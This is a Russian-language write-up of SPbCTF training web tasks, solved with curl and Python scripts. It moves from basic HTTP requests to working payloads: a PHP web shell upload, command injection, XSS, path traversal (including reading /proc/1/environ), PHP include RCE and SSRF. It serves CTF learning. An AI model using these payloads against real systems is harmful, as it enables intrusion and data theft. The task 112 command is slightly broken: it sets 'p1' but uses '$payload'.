# SPBCTF webkids

https://web-kids20.forkbomb.ru/tasks

Читаем man curl , чтобы понять как работают решения простых тасков. Для поиска по ману `/` и параметр.

## таск 1

```bash
curl http://kslweb1.spb.ctf.su/first/level1
```

## таск 2

```bash
curl -L -k http://kslweb1.spb.ctf.su/first/level2
```

>  -k, --insecure    | Allow insecure server connections => также игнорит некоторые ошибки http

> -L, --location     | Follow redirects => обращаться далее после перенаправлений

## таск 3

```bash
curl -L -k http://kslweb1.spb.ctf.su/first/level3
```

## таск 4

```bash
curl -X POST -d "want_flag=YES" -d "code=1337" http://kslweb1.spb.ctf.su/first/level4/
```

> -X, --request <method>    |  Specify request method to use

>  -d, --data <data> | HTTP POST data , параметры, передаваемые в теле запроса POST

## таск 5

```bash
curl -X POST -d "fun=Kaspersky%20%26%20Summer%20%26%20Lab" "http://kslweb1.spb.ctf.su/first/level5/"
```

> --data-urlencode <data>  | HTTP POST data URL encoded , но проще руками энкодить, чтобы точно нужный формат

## таск 6

```bash
curl -H "SPbCTF: Pretty cool" "http://kslweb1.spb.ctf.su/first/level6/"
```

>  -H, --header < header/@file > | Pass custom header(s) to server

## таск 7

```bash
# ибо echo a{1..100}; будет a1;a1;a3;...
curl -v -H "Cookie: $(printf 'a%03d=1;' {1..100})" "http://kslweb1.spb.ctf.su/first/level7/"
```

> -v, --verbose | Make the operation more talkative => подробный вывод, проще понять что происходит

## таск 8 

```bash
curl -i http://kslweb1.spb.ctf.su/first/level8/ 
``` 

> -i, --show-headers | Show response headers in output

## таск 9

Через `curl -i ...` видим 

```http
Set-Cookie: do_i_really_want_flag_for_level_nine=no; expires=...
```

следовательно прописываем куки через заголовки реквеста

```bash
curl -H "Cookie: do_i_really_want_flag_for_level_nine=yes" "http://kslweb1.spb.ctf.su/first/level9/"
```

## таск 10

Чекаем скрытые файлы и папки, криво настроенный обратный прокси на права чтения и листинг директорий
```bash
curl http://kslweb1.spb.ctf.su/first/level10/robots.txt
```
```bash
curl http://kslweb1.spb.ctf.su/first/level10/hidden_admin_panel_WOW.php
```

## таск 11 

Как в 10, но автоматизируя через dirsearch, dirb, ffuf, wfuzz, Burp intruder, Caido Automate

```bash
dirsearch -u http://kslweb1.spb.ctf.su/first/level11/
```
```bash
curl -k -L http://kslweb1.spb.ctf.su/first/level11/management
```

## таск 12

```bash
curl -v http://kslweb1.spb.ctf.su/first/level12/
```
читаем код js:
```js
function tryPassword() {
  var flag = document.getElementById('ctfflag').value;

  if (flag.length != 32) { alert("WRONG because of # 1"); return; }
  if (flag.substr(0, 16) != "4fd1a3d79a407b66") {alert("WRONG because of # 2");return;}
  if (flag.substr(19, 3) != "cbf") { alert("WRONG because of # 3");return;}
  if (flag.substr(16, 3) != "d37") { alert("WRONG because of # 4"); return; }
  if (flag.substr(22, 6) != "61a7ab") { alert("WRONG because of # 5");return;}
  if (flag.substr(28, 2) != flag.substr(0, 2)) { alert("WRONG because of # 6");return;}
  if (flag.substr(30, 2) != 0x0E) { alert("WRONG because of # 7"); return;}
  alert("YES, exactly!");
}
```
В 6 проверке сравнивается с подстрокой из первых двух символов это 4f, 0x0E это 14. 
Флаг KSL{4fd1a3d79a407b66d37cbf61a7ab4f14}

## таск 13 
> Where else the flag can be placed by JS?

Через DevTools открываем Storage -> LocalStorage 

## таск 14

```bash
curl http://kslweb1.spb.ctf.su/first//level14/index.php?give_flag=1 -o im.png
```

>  -o, --output <file>  | Write to file instead of stdout

## таск 15 

> You should upload a file here which is exactly 1337 bytes.

> Current uploaded files (PHP $_FILES[] array): Array ( )

Здесь уже проще без curl. Генерим файлик через dd и грузим руками через форму
```bash
dd if=/dev/urandom of=f.txt bs=1 count=1337
```

## таск 16

> This task requires you to write HTTP requests by hand.

>  try sending each request line separately, wait some time after each line.

Сначала пробуем руками - работает, но скучно. Автоматизируем на python прямо как в подсказке
```python
import socket, time, random

with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
    print("Connected, wait some time")
    for line in [
            "GET /second/level16/ HTTP/1.1",
            "Host: kslweb1.spb.ctf.su",
            "Connection: close", ""]:
        sock.sendall((line + "\r\n").encode('utf-8'))
        time.sleep(random.uniform(0.5, 3.2))
    print(sock.recv(4096).decode())
```

## таск 17

> Nope, you should send a request with at least 100 different cookies (how are cookies made in raw http?)

по сути решение как в таске 7, чтобы вручную можно в bash выполнить  
```bash
echo "Cookie: $(printf 'a%d=1;' {1..100})"
```
или на python
```python
import socket, time, random

cookies = ";".join([
    f"a{i}=b{i}" 
    for i in range(100)
]) 
# eq Cookie: a0=b0;a1=b1 ...

with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
    print("Connected, wait some time")
    for line in [
            "GET /second/level17/ HTTP/1.1",
            "Host: kslweb1.spb.ctf.su",
            f"Cookie: {cookies}",
            "Connection: close", ""]:
        print(line)
        sock.sendall((line + "\r\n").encode('utf-8'))
        time.sleep(random.uniform(0.5, 3.2))
    print(sock.recv(4096).decode())
```

## таск 18

> !!!!!!######Nope, you should send one POST field 'makers' with words 'Kaspersky & SPBCTF' (how post values are encoded?)

https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=S2FzcGVyc2t5ICYgU1BCQ1RG

```python
import socket, time, random

with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
    print("Connected, wait some time")
    data = "makers=Kaspersky+%26+SPBCTF" # url encoding
    for line in [
            "POST /second/level18/ HTTP/1.1",
            "Host: kslweb1.spb.ctf.su",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(data)}",
            "Connection: close", "", data, ""]:
        print(line)
        sock.sendall((line + "\r\n").encode('utf-8'))
        time.sleep(random.uniform(0.5, 3.2))
    print(sock.recv(4096).decode())
```

## таск 19

> Nope, you should send one POST field 'smiley' with this exact face - it contains 6 lines of text

> (how post values are encoded? if google doesnt help maybe we can see how it is transmitted on some other website?)

```python
import socket, time, random
from urllib.parse import quote

smiley = """+|||||+
| - - |
| O_o |
|  |  |
| \__ |
 \___/"""
enc = quote(smiley)

with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
    print("Connected, wait some time")
    data = f"smiley={enc}"
    for line in [
            "POST /second/level19/ HTTP/1.1",
            "Host: kslweb1.spb.ctf.su",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(data)}",
            "Connection: close", "", data, ""]:
        print(line)
        sock.sendall((line + "\r\n").encode('utf-8'))
        time.sleep(random.uniform(0.5, 3.2))
    print(sock.recv(4096).decode())
```
## таск 20

> Nope, you should send a Basic authentication with your request (how does basic auth work?)

> Username: admin

> Password: s3cr3tp4$$w0RD

```python
import socket, time, random, base64

creds = "admin:s3cr3tp4$$w0RD"
enc = base64.b64encode(
    creds.encode('utf-8')  # encode for b64 input
).decode('utf-8') # decode output back to utf str

with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
    print("Connected, wait some time")
    for line in [
            "GET /second/level20/ HTTP/1.1",
            "Host: kslweb1.spb.ctf.su",
            f"Authorization: Basic {enc}",
            "Connection: close", ""]:
        print(line)
        sock.sendall((line + "\r\n").encode('utf-8'))
        time.sleep(random.uniform(0.5, 3.2))
    print(sock.recv(4096).decode())
```

## таск 21

> You should upload a file here with name ending in .php (for example, 'shell.php') but MIME type 'image/png'

```html
File: <input type='file' name='myfile' /> <input type='submit' value='Upload &raquo;' /></form>
```
следовательно имя myfile, имя файла shell.php и тип image/png

```python
import socket, time, random

with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
    print("Connected, wait some time")
    boundary = f"----WebBoundary{random.randint(1000,9999)}"
    data = [
        f"--{boundary}",
        "Content-Disposition: form-data; name=\"myfile\"; filename=\"shell.php\"",
        "Content-Type: image/png",
        "",
        "<?=`$_GET[0]`?>",  # from https://www.revshells.com/ , just for fun
        f"--{boundary}--"
    ]
    for line in [
        "POST /second/level21/ HTTP/1.1",
        "Host: kslweb1.spb.ctf.su",
        f"Content-Type: multipart/form-data; boundary={boundary}",
        f"Content-Length: {sum(len(l)+2 for l in data)}",
        "Connection: close", ""
    ] + data + ["",]:
        print(line)
        sock.sendall((line + "\r\n").encode('utf-8'))
        time.sleep(random.uniform(0.5, 3.2))
    print(sock.recv(4096).decode())
```

## таски 24 - 28 недоступны 
## таск 29 sh

Пользовательский ввод напрямую вставляется в команду баша, затем вывод из stdout, нужно отрезать лишнее и обойти ошибки.

Полезная нагрузка `1.1; cat flag`

```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/ping' --data-raw 'address=1.1%3B+cat+flag' | jq
```

## таск 30 sh

Полезная нагрузка
```
/|cat flag
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/ls' --data-raw 'dir=/|cat+flag' | jq
```

## таск 31 sh

Полезная нагрузка
```
1&&cat /flag
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/ps' --data-raw 'pid=1%26%26cat+%2Fflag' | jq
```

## таск 32 sh

Полезная нагрузка
```bash
`cat flag`
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/echo1' --data-raw 'what=%60cat+flag%60' | jq
```

## таск 33 sh

Полезная нагрузка
```bash
$(cat flag)
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/echo2' --data-raw 'what=%24(cat+flag)' | jq
```

## таск 34 sh

Полезная нагрузка
```bash
cat flag # idk
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/grep' --data-raw 'shell=cat+flag+%23' | jq
```

## таск 84 XSS

В коде уязвимость в конкатенации 
```js
return '<input type="text" value="' + input + '">;';
```
решение 
```html
"/><svg/onload=prompt("sibears")>
```
так как преобразуется в 
```html
<input type="text" value=" "/><svg/onload=prompt("sibears")>">;
```
то есть закрываем тег input, создаем картинку, на событие ее загрузки вешаем JS

## таск 85 XSS

Здесь нужно починить синтаксис после конкатенации
```js
");prompt("sibears");("
```
```html
<script>console.log("");prompt("sibears");("");</script>
```

## таск 86 XSS

Некоторые теги на уровне HTML / V8 блокируют исполнение 
```html
</textarea><svg/onload=prompt("sibears")>
```
```html
<textarea> </textarea>
<svg/onload=prompt("sibears")>
</textarea>
```

## таск 87 XSS

```html
<svg/onload=prompt("sibears")>
```
```html
<svg xmlns="http://www.w3.org/1999/svg"> <circle r="10" fill="red"></circle><svg/onload=prompt("sibears")> </svg>
```

## таск 88 XSS

```html
JavaScript:prompt(`sibears`)
```
```html
<a href="JavaScript:prompt(`sibears`)">Click ME </a>
```

## таск 89 XSS

```html
a}}}}}}}; prompt("sibears");//
``` 
=>
```html
<script>
var a = "", b = "";
var obj = {a: a, b: b, c: {a: a, b: b, c: {a: a, b: b, c: {a: a, b: function(a) { if (a) {return {a: a, b: a}}}}}}}; prompt("sibears");//}}}}}}};
</script>
```

## таск 92 XSS

```html
" onerror=prompt("sibears") onerror="
```
```html
<script src=" " onerror=prompt("sibears") onerror=""></script>
```




## таск 106 LFI

```bash
curl -s https://2019-11-10-favn.ctf.su/
```
в html видим это
```html
<link rel="icon" href="/static/?file=favicon.ico">
```
следовательно может можем и другие файлы
```bash
curl "https://2019-11-10-favn.ctf.su/static/?file=../flag"
```

## таск 107 LFI

```bash
curl -s "https://2019-11-10-waf.ctf.su/"
```
в html видим это
```html
<div class="text-center">
    <img src="/static?file=rori.png" class="img-fluid rounded" height="30%">
</div>
```
в исходнике видим это 
```go
http.HandleFunc("/static/", staticHandler)
// ... ->
func staticHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	filepath := r.Form.Get("file")
	filepath = fmt.Sprintf("static/%v", filepath)
    // ...
	if strings.Contains(filepath, "..") {
		filepath = strings.ReplaceAll(filepath, "..", ".")
	}

	file, _ := ioutil.ReadFile(filepath)
	w.Write(file)
}
```
```bash
# ибо strings.ReplaceAll находит отдельно .. и приводит .... к ..
curl "https://2019-11-10-waf.ctf.su/static/?file=..../flag"
```

## таск 108 LFI

в исходнике [здесь](https://github.com/Sinketsu/kids-css-minify/blob/master/src/Minifier.php) видим сначала это 
```php
$importContent = file_get_contents($path);
```
и проверку расширения 
```php
protected function isImage($path)
{
    foreach ($this->imageExtensions as $ext) {
        if (stripos($path, $ext) > 0) {
            return true;
        }
    }
    return false;
}
```
```bash
curl 'https://2019-11-10-css.ctf.su/compress.php' --data-raw 'css=body%7Bbackground%3Aurl(%22%2Fa.jpg%2F..%2F..%2F..%2F..%2Fflag%22)%7D' 
```

## Таск 109 LFI

в исходнике видим это 
```go
func staticHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	filepath := r.Form.Get("file")
	filepath = fmt.Sprintf("static/%v", filepath)
    // ...
	file, err := ioutil.ReadFile(filepath)
    // ...
	w.Write(file)
}
```

```bash
curl "https://2019-11-10-docker1.ctf.su/static/?file=../../../idk/path/to/flag"
```

## Таск 110 LFI

```go
flag, _ := os.LookupEnv("FLAG")
flag = flag
```

```bash
curl "https://2019-11-10-docker2.ctf.su/static/?file=../../..//proc/1/environ" -o f.txt
```

## Таск 111 LFI

в исходнике видим это 
```go
flagFile, err := os.Open("/PATCHED")
if err != nil {
    log.Println(err)
}
flagFile = flagFile
```

```bash
curl "https://2019-11-10-docker3.ctf.su/static/?file=../main.go"
```
```bash
curl "https://2019-11-10-docker3.ctf.su/static/?file=../../..//flag_directory/idk/flag"
```

## Таск 112 LFI RCE

в исходном коде и подсказка параметра:
```php
</body>
</html><?php
    $file = $_GET['include'];

    include $file;
?><?php
    echo "Get flag from <a href=\"/get.php?include=flag.php\">/get.php?include=flag.php</a><br><br>";
    echo "O, i turn `allow_url_include` On :)";
?>
```
название файла изменили, `include $file;` может исполнять php код
```bash
p1=$(echo -n '<?php system($_GET["cmd"]);?>' | base64)
curl "https://2019-11-10-rce.ctf.su/get.php?include=data://text/plain;base64,$payload&cmd=cat+*"
```

## Таск 113 LFI
```bash
curl "https://2019-11-10-local.ctf.su/get.php?get=http://127.0.0.1:/"
```
